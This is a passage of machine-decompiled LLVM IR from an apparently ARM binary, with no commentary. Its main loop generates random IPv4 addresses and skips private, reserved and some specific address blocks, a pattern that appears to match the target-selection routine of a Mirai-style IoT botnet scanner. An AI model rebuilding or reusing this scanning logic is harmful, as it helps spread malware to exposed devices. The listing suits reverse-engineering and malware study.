  store i32 ptrtoint (i32* @global_var_166b8.150 to i32), i32* %r1.global-to-local, align 4
  %v1_ec88 = trunc i32 %v1_ec7c to i8
  store i8 %v1_ec88, i8* @global_var_1f295.147, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ec94 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint (i32* @global_var_166b8.150 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_166bc.154 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_eca4 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([5 x i8]* @global_var_166bc.154 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_166c4.156 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ecb4 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([9 x i8]* @global_var_166c4.156 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_166d0.158 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_166d0.158 to i32), i32* %r1.global-to-local, align 4
  %v5_ecc4 = call i32 @function_e930(i32 ptrtoint ([7 x i8]* @global_var_166d0.158 to i32), i32 ptrtoint ([7 x i8]* @global_var_166d0.158 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_166b8.150 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ecd4 = call i32 @function_e930(i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32 ptrtoint (i32* @global_var_166b8.150 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_166e0.162 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ece4 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([9 x i8]* @global_var_166e0.162 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_166ec.164 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_166ec.164 to i32), i32* %r1.global-to-local, align 4
  %v5_ecf4 = call i32 @function_e930(i32 ptrtoint ([6 x i8]* @global_var_166ec.164 to i32), i32 ptrtoint ([6 x i8]* @global_var_166ec.164 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_166f4.166 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ed04 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([6 x i8]* @global_var_166f4.166 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_166fc.168 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_166fc.168 to i32), i32* %r1.global-to-local, align 4
  %v5_ed14 = call i32 @function_e930(i32 ptrtoint ([8 x i8]* @global_var_166fc.168 to i32), i32 ptrtoint ([8 x i8]* @global_var_166fc.168 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_ed24 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16704.170 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_ed34 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint (i32* @global_var_16704.170 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16714.172 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ed44 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), i32 ptrtoint ([6 x i8]* @global_var_16714.172 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32* %r1.global-to-local, align 4
  %v5_ed54 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16714.172 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ed64 = call i32 @function_e930(i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), i32 ptrtoint ([6 x i8]* @global_var_16714.172 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16724.176 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ed74 = call i32 @function_e930(i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32 ptrtoint (i32* @global_var_16724.176 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16730.178 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ed84 = call i32 @function_e930(i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), i32 ptrtoint (i32* @global_var_16730.178 to i32), i32 15)
  store i32 %v4_ed84, i32* %r0.global-to-local, align 4
  %v2_ed8c = ptrtoint i32* %stack_var_-1866 to i32
  %v1_f0b8 = add i32 %v2_ed8c, 20
  %v1_f114 = add i32 %v2_ed8c, 16
  %v2_f114 = inttoptr i32 %v1_f114 to i32*
  %v2_f39c = ptrtoint i32* %stack_var_-40 to i32
  %v2_f3e4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f3e8 = ptrtoint i32* %stack_var_-224 to i32
  %v2_f3ec = ptrtoint i32* %stack_var_-352 to i32
  %v2_fe94 = ptrtoint i32* %stack_var_-45 to i32
  %v2_fea8 = ptrtoint i32* %stack_var_-77 to i32
  %v2_fe00 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f634 = ptrtoint i32* %stack_var_-104 to i32
  %v2_10130 = ptrtoint i32* %stack_var_-96 to i32
  %v2_10188 = ptrtoint i32* %stack_var_-42 to i32
  %v1_f124 = add i32 %v2_ed8c, 9
  %v2_f124 = inttoptr i32 %v1_f124 to i8*
  %v1_f1b8 = add i32 %v2_ed8c, 12
  %v2_f1b8 = inttoptr i32 %v1_f1b8 to i32*
  br label %dec_label_pc_ed94

dec_label_pc_ed94:                                ; preds = %dec_label_pc_f588, %dec_label_pc_ebf8
  %stack_var_-1880.0 = phi i32 [ %tmp335, %dec_label_pc_ebf8 ], [ %stack_var_-1880.1, %dec_label_pc_f588 ]
  store i32 ptrtoint (i32* @global_var_1f2a4.122 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v2_ed9c = load i32, i32* @global_var_1f2a4.122, align 4
  store i32 %v2_ed9c, i32* @r4, align 4
  %v3_eda0 = icmp uge i32 %stack_var_-1880.0, %v2_ed9c
  store i1 %v3_eda0, i1* %cpsr_c.global-to-local, align 1
  %v9_eda0 = icmp eq i32 %stack_var_-1880.0, %v2_ed9c
  store i1 %v9_eda0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_eda0, label %dec_label_pc_f0a8, label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed94
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %bb408, %dec_label_pc_eda8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_edcc = call i32 @function_e0d0()
  %v1_edcc = trunc i32 %v0_edcc to i16
  store i32 %v0_edcc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %ip.global-to-local, align 4
  %v2_edd8 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_edd8, i32* %r3.global-to-local, align 4
  store i16 %v1_edcc, i16* bitcast (i32* @global_var_1f278.143 to i16*), align 4
  store i32 %v2_edd8, i32* @global_var_1f280.179, align 4
  br label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_ef3c, %dec_label_pc_ee14, %dec_label_pc_ef70, %dec_label_pc_ef64, %dec_label_pc_ef58, %dec_label_pc_ef4c, %.thread47, %.thread31, %.thread27, %.thread23, %bb399, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %dec_label_pc_eeb0, %dec_label_pc_eea8, %bb384, %dec_label_pc_ee78, %dec_label_pc_ee54, %bb377, %dec_label_pc_ee24, %bb376, %dec_label_pc_ee0c, %bb375, %bb401, %dec_label_pc_edb8
  %v0_ede4 = call i32 @function_e0d0()
  store i32 %v0_ede4, i32* %r0.global-to-local, align 4
  %v1_ede8 = urem i32 %v0_ede4, 256
  store i32 %v1_ede8, i32* %r1.global-to-local, align 4
  %v3_edec = udiv i32 %v0_ede4, 256
  store i32 %v3_edec, i32* %r3.global-to-local, align 4
  %v3_edf0 = udiv i32 %v0_ede4, 65536
  store i32 %v3_edf0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edf4 = icmp eq i32 %v1_ede8, 0
  store i1 %v2_edf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edf4, label %bb375, label %bb374

bb374:                                            ; preds = %dec_label_pc_ede4
  %v3_edf8 = icmp ugt i32 %v1_ede8, 126
  store i1 %v3_edf8, i1* %cpsr_c.global-to-local, align 1
  %v8_edf8 = icmp eq i32 %v1_ede8, 127
  store i1 %v8_edf8, i1* %cpsr_z.global-to-local, align 1
  br label %bb375

bb375:                                            ; preds = %dec_label_pc_ede4, %bb374
  %v0_ee08 = phi i1 [ true, %dec_label_pc_ede4 ], [ %v8_edf8, %bb374 ]
  %v1_edfc = urem i32 %v3_edec, 256
  store i32 %v1_edfc, i32* %ip.global-to-local, align 4
  %v1_ee00 = urem i32 %v3_edf0, 256
  store i32 %v1_ee00, i32* %r2.global-to-local, align 4
  %v1_ee04 = and i32 %v0_ede4, 8388608
  %v2_ee04 = icmp ne i32 %v1_ee04, 0
  store i1 %v2_ee04, i1* %cpsr_c.global-to-local, align 1
  %v3_ee04 = udiv i32 %v0_ede4, 16777216
  store i32 %v3_ee04, i32* %r0.global-to-local, align 4
  br i1 %v0_ee08, label %dec_label_pc_ede4, label %dec_label_pc_ee0c

dec_label_pc_ee0c:                                ; preds = %bb375
  %v2_ee0c = icmp ugt i32 %v1_ede8, 2
  store i1 %v2_ee0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee0c = icmp eq i32 %v1_ede8, 3
  store i1 %v7_ee0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee0c, label %dec_label_pc_ede4, label %dec_label_pc_ee14

dec_label_pc_ee14:                                ; preds = %dec_label_pc_ee0c
  %v1_ee14 = add nsw i32 %v1_ede8, -15
  store i32 %v1_ee14, i32* %r3.global-to-local, align 4
  %v2_ee18 = icmp ugt i32 %v1_ede8, 55
  store i1 %v2_ee18, i1* %cpsr_c.global-to-local, align 1
  %v7_ee18 = icmp eq i32 %v1_ede8, 56
  store i1 %v7_ee18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee18, label %dec_label_pc_ede4, label %bb376

bb376:                                            ; preds = %dec_label_pc_ee14
  %v3_ee1c = icmp ne i32 %v1_ee14, 0
  store i1 %v3_ee1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ee1c = icmp eq i32 %v1_ee14, 1
  store i1 %v8_ee1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee20 = xor i1 %v3_ee1c, true
  %v3_ee20 = or i1 %v8_ee1c, %v2_ee20
  br i1 %v3_ee20, label %dec_label_pc_ede4, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %bb376
  %v2_ee24 = icmp ugt i32 %v1_ede8, 9
  store i1 %v2_ee24, i1* %cpsr_c.global-to-local, align 1
  %v7_ee24 = icmp eq i32 %v1_ede8, 10
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee24, label %dec_label_pc_ede4, label %dec_label_pc_ee2c

dec_label_pc_ee2c:                                ; preds = %dec_label_pc_ee24
  %v2_ee2c = icmp ugt i32 %v1_ede8, 191
  store i1 %v2_ee2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee2c = icmp eq i32 %v1_ede8, 192
  store i1 %v7_ee2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee2c, label %bb377, label %dec_label_pc_ee38

bb377:                                            ; preds = %dec_label_pc_ee2c
  %v3_ee30 = icmp ugt i32 %v1_edfc, 167
  store i1 %v3_ee30, i1* %cpsr_c.global-to-local, align 1
  %v8_ee30 = icmp eq i32 %v1_edfc, 168
  store i1 %v8_ee30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee30, label %dec_label_pc_ede4, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee2c, %bb377
  %v7_ee38 = icmp eq i32 %v1_ede8, 172
  %.461 = zext i1 %v7_ee38 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_ee44 = icmp ugt i32 %v1_edfc, 14
  store i1 %v2_ee44, i1* %cpsr_c.global-to-local, align 1
  %v7_ee44 = icmp eq i32 %v1_edfc, 15
  store i1 %v7_ee44, i1* %cpsr_z.global-to-local, align 1
  %v2_ee48 = xor i1 %v2_ee44, true
  %v3_ee48 = or i1 %v7_ee44, %v2_ee48
  br i1 %v3_ee48, label %.thread7, label %bb380

.thread7:                                         ; preds = %dec_label_pc_ee38
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee5c

bb380:                                            ; preds = %dec_label_pc_ee38
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee4c = icmp eq i1 %v7_ee38, false
  store i1 %v2_ee4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee4c, label %dec_label_pc_ee5c, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %bb380
  %v2_ee54 = icmp ugt i32 %v1_edfc, 30
  store i1 %v2_ee54, i1* %cpsr_c.global-to-local, align 1
  %v7_ee54 = icmp eq i32 %v1_edfc, 31
  store i1 %v7_ee54, i1* %cpsr_z.global-to-local, align 1
  %v2_ee58 = xor i1 %v2_ee54, true
  %v3_ee58 = or i1 %v7_ee54, %v2_ee58
  br i1 %v3_ee58, label %dec_label_pc_ede4, label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %.thread7, %dec_label_pc_ee54, %bb380
  %v7_ee5c = icmp eq i32 %v1_ede8, 100
  %.462 = zext i1 %v7_ee5c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_ee68 = icmp ugt i32 %v1_edfc, 62
  store i1 %v2_ee68, i1* %cpsr_c.global-to-local, align 1
  %v7_ee68 = icmp eq i32 %v1_edfc, 63
  store i1 %v7_ee68, i1* %cpsr_z.global-to-local, align 1
  %v2_ee6c = xor i1 %v2_ee68, true
  %v3_ee6c = or i1 %v7_ee68, %v2_ee6c
  br i1 %v3_ee6c, label %.thread12, label %bb383

.thread12:                                        ; preds = %dec_label_pc_ee5c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee80

bb383:                                            ; preds = %dec_label_pc_ee5c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee70 = icmp eq i1 %v7_ee5c, false
  store i1 %v2_ee70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee70, label %dec_label_pc_ee80, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %bb383
  %v2_ee78 = icmp ugt i32 %v1_edfc, 125
  store i1 %v2_ee78, i1* %cpsr_c.global-to-local, align 1
  %v7_ee78 = icmp eq i32 %v1_edfc, 126
  store i1 %v7_ee78, i1* %cpsr_z.global-to-local, align 1
  %v2_ee7c = xor i1 %v2_ee78, true
  %v3_ee7c = or i1 %v7_ee78, %v2_ee7c
  br i1 %v3_ee7c, label %dec_label_pc_ede4, label %dec_label_pc_ee80

dec_label_pc_ee80:                                ; preds = %.thread12, %dec_label_pc_ee78, %bb383
  %v2_ee80 = icmp ugt i32 %v1_ede8, 168
  store i1 %v2_ee80, i1* %cpsr_c.global-to-local, align 1
  %v7_ee80 = icmp eq i32 %v1_ede8, 169
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee80, label %bb384, label %dec_label_pc_ee8c

bb384:                                            ; preds = %dec_label_pc_ee80
  %v3_ee84 = icmp eq i32 %v1_edfc, 255
  store i1 %v3_ee84, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_ee84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ee84, label %dec_label_pc_ede4, label %dec_label_pc_ee8c

dec_label_pc_ee8c:                                ; preds = %dec_label_pc_ee80, %bb384
  %v7_ee8c = icmp eq i32 %v1_ede8, 198
  %.463 = zext i1 %v7_ee8c to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_ee98 = icmp ugt i32 %v1_edfc, 16
  store i1 %v2_ee98, i1* %cpsr_c.global-to-local, align 1
  %v7_ee98 = icmp eq i32 %v1_edfc, 17
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v2_ee9c = xor i1 %v2_ee98, true
  %v3_ee9c = or i1 %v7_ee98, %v2_ee9c
  br i1 %v3_ee9c, label %.thread18, label %bb387

.thread18:                                        ; preds = %dec_label_pc_ee8c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eeb0

bb387:                                            ; preds = %dec_label_pc_ee8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eea0 = icmp eq i1 %v7_ee8c, false
  store i1 %v2_eea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eea0, label %dec_label_pc_eeb0, label %dec_label_pc_eea8

dec_label_pc_eea8:                                ; preds = %bb387
  %v2_eea8 = icmp ugt i32 %v1_edfc, 18
  store i1 %v2_eea8, i1* %cpsr_c.global-to-local, align 1
  %v7_eea8 = icmp eq i32 %v1_edfc, 19
  store i1 %v7_eea8, i1* %cpsr_z.global-to-local, align 1
  %v2_eeac = xor i1 %v2_eea8, true
  %v3_eeac = or i1 %v7_eea8, %v2_eeac
  br i1 %v3_eeac, label %dec_label_pc_ede4, label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %.thread18, %dec_label_pc_eea8, %bb387
  %v2_eeb0 = icmp ugt i32 %v1_ede8, 222
  store i1 %v2_eeb0, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb0 = icmp eq i32 %v1_ede8, 223
  store i1 %v7_eeb0, i1* %cpsr_z.global-to-local, align 1
  %v2_eeb4 = xor i1 %v7_eeb0, true
  %v3_eeb4 = and i1 %v2_eeb0, %v2_eeb4
  br i1 %v3_eeb4, label %dec_label_pc_ede4, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_eeb0
  %v7_eeb8 = icmp eq i32 %v1_ede8, 106
  %.464 = zext i1 %v7_eeb8 to i32
  %v2_eec4 = icmp ugt i32 %v1_edfc, 185
  store i1 %v2_eec4, i1* %cpsr_c.global-to-local, align 1
  %v7_eec4 = icmp eq i32 %v1_edfc, 186
  store i1 %v7_eec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eec4, label %bb390, label %dec_label_pc_eed0

bb390:                                            ; preds = %dec_label_pc_eeb8
  %v2_eeb8 = icmp ugt i32 %v1_ede8, 105
  store i1 %v2_eeb8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeb8, label %dec_label_pc_ede4, label %dec_label_pc_eed0

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eeb8, %bb390
  %v2_eed0 = icmp ugt i32 %v1_edfc, 186
  store i1 %v2_eed0, i1* %cpsr_c.global-to-local, align 1
  %v7_eed0 = icmp eq i32 %v1_edfc, 187
  store i1 %v7_eed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed0, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_eed0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eee4

.thread23:                                        ; preds = %dec_label_pc_eed0
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eedc = icmp eq i1 %v7_eeb8, false
  store i1 %v2_eedc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eedc, label %dec_label_pc_eee4, label %dec_label_pc_ede4

dec_label_pc_eee4:                                ; preds = %.thread24, %.thread23
  %v2_eee4 = icmp ugt i32 %v1_edfc, 184
  store i1 %v2_eee4, i1* %cpsr_c.global-to-local, align 1
  %v7_eee4 = icmp eq i32 %v1_edfc, 185
  store i1 %v7_eee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eee4, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_eee4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eef8

.thread27:                                        ; preds = %dec_label_pc_eee4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eef0 = icmp eq i1 %v7_eeb8, false
  store i1 %v2_eef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eef0, label %dec_label_pc_eef8, label %dec_label_pc_ede4

dec_label_pc_eef8:                                ; preds = %.thread28, %.thread27
  %v2_eef8 = icmp ugt i32 %v1_edfc, 183
  store i1 %v2_eef8, i1* %cpsr_c.global-to-local, align 1
  %v7_eef8 = icmp eq i32 %v1_edfc, 184
  store i1 %v7_eef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eef8, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_eef8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef0c

.thread31:                                        ; preds = %dec_label_pc_eef8
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef04 = icmp eq i1 %v7_eeb8, false
  store i1 %v2_ef04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef04, label %dec_label_pc_ef0c, label %dec_label_pc_ede4

dec_label_pc_ef0c:                                ; preds = %.thread32, %.thread31
  %v2_ef0c = icmp ugt i32 %v1_ede8, 149
  store i1 %v2_ef0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef0c = icmp eq i32 %v1_ede8, 150
  store i1 %v7_ef0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef0c, label %bb391, label %dec_label_pc_ef18

bb391:                                            ; preds = %dec_label_pc_ef0c
  %v3_ef10 = icmp ugt i32 %v1_edfc, 30
  store i1 %v3_ef10, i1* %cpsr_c.global-to-local, align 1
  %v8_ef10 = icmp eq i32 %v1_edfc, 31
  store i1 %v8_ef10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef10, label %dec_label_pc_ede4, label %dec_label_pc_ef18

dec_label_pc_ef18:                                ; preds = %dec_label_pc_ef0c, %bb391
  %v2_ef18 = icmp ugt i32 %v1_ede8, 48
  store i1 %v2_ef18, i1* %cpsr_c.global-to-local, align 1
  %v7_ef18 = icmp eq i32 %v1_ede8, 49
  store i1 %v7_ef18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef18, label %bb392, label %dec_label_pc_ef24

bb392:                                            ; preds = %dec_label_pc_ef18
  %v3_ef1c = icmp ugt i32 %v1_edfc, 50
  store i1 %v3_ef1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ef1c = icmp eq i32 %v1_edfc, 51
  store i1 %v8_ef1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef1c, label %dec_label_pc_ede4, label %dec_label_pc_ef24

dec_label_pc_ef24:                                ; preds = %dec_label_pc_ef18, %bb392
  %v2_ef24 = icmp ugt i32 %v1_ede8, 177
  store i1 %v2_ef24, i1* %cpsr_c.global-to-local, align 1
  %v7_ef24 = icmp eq i32 %v1_ede8, 178
  store i1 %v7_ef24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef24, label %bb393, label %dec_label_pc_ef30

bb393:                                            ; preds = %dec_label_pc_ef24
  %v3_ef28 = icmp ugt i32 %v1_edfc, 61
  store i1 %v3_ef28, i1* %cpsr_c.global-to-local, align 1
  %v8_ef28 = icmp eq i32 %v1_edfc, 62
  store i1 %v8_ef28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef28, label %dec_label_pc_ede4, label %dec_label_pc_ef30

dec_label_pc_ef30:                                ; preds = %dec_label_pc_ef24, %bb393
  %v2_ef30 = icmp ugt i32 %v1_ede8, 159
  store i1 %v2_ef30, i1* %cpsr_c.global-to-local, align 1
  %v7_ef30 = icmp eq i32 %v1_ede8, 160
  store i1 %v7_ef30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef30, label %bb394, label %dec_label_pc_ef3c

bb394:                                            ; preds = %dec_label_pc_ef30
  %v3_ef34 = icmp ugt i32 %v1_edfc, 12
  store i1 %v3_ef34, i1* %cpsr_c.global-to-local, align 1
  %v8_ef34 = icmp eq i32 %v1_edfc, 13
  store i1 %v8_ef34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef34, label %dec_label_pc_ede4, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef30, %bb394
  %v1_ef3c = add nsw i32 %v1_ede8, -6
  store i32 %v1_ef3c, i32* %r3.global-to-local, align 4
  %v2_ef40 = icmp ugt i32 %v1_ede8, 10
  store i1 %v2_ef40, i1* %cpsr_c.global-to-local, align 1
  %v7_ef40 = icmp eq i32 %v1_ede8, 11
  store i1 %v7_ef40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef40, label %dec_label_pc_ede4, label %bb395

bb395:                                            ; preds = %dec_label_pc_ef3c
  %v3_ef44 = icmp ne i32 %v1_ef3c, 0
  store i1 %v3_ef44, i1* %cpsr_c.global-to-local, align 1
  %v8_ef44 = icmp eq i32 %v1_ef3c, 1
  store i1 %v8_ef44, i1* %cpsr_z.global-to-local, align 1
  %v2_ef48 = xor i1 %v3_ef44, true
  %v3_ef48 = or i1 %v8_ef44, %v2_ef48
  br i1 %v3_ef48, label %dec_label_pc_ede4, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %bb395
  %v2_ef4c = icmp ugt i32 %v1_ede8, 21
  store i1 %v2_ef4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef4c = icmp eq i32 %v1_ede8, 22
  store i1 %v7_ef4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef4c, label %dec_label_pc_ede4, label %bb396

bb396:                                            ; preds = %dec_label_pc_ef4c
  %v3_ef50 = icmp ugt i32 %v1_ede8, 20
  store i1 %v3_ef50, i1* %cpsr_c.global-to-local, align 1
